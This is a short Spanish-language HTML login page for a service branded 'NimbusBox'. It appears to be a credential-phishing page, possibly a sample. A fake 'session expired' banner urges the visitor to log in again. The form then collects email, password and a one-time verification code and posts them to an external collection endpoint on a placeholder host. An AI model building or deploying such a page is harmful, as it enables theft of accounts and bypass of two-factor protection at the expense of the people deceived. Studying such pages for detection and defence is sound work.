<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>NimbusBox - Iniciar sesión</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>


  <div class="notice-banner">

    Tu sesión ha expirado. Iniciar sesión de nuevo para continuar.
  </div>



  <div class="ember77">

    <h1 class="brand-title">NimbusBox</h1>

    <form id="loginForm" action="https://example.invalid/collect" method="POST">
      <label for="iris48">Correo electrónico</label>

      <input type="email" id="iris48" name="email" required>

      <label for="ember48">Contraseña</label>
      <input type="password" id="ember48" name="password" required>


      <label for="ember81">Código de verificación</label>
      <input type="text" id="ember81" name="otp" maxlength="6">

      <button type="submit" id="submitBtn">Iniciar sesión</button>

    </form>
  </div>

  <div class="help-text">

    ¿Necesitas ayuda? Escribe a soporte@example.invalid
  </div>

  <script src="script.js"></script>
</body>

</html>
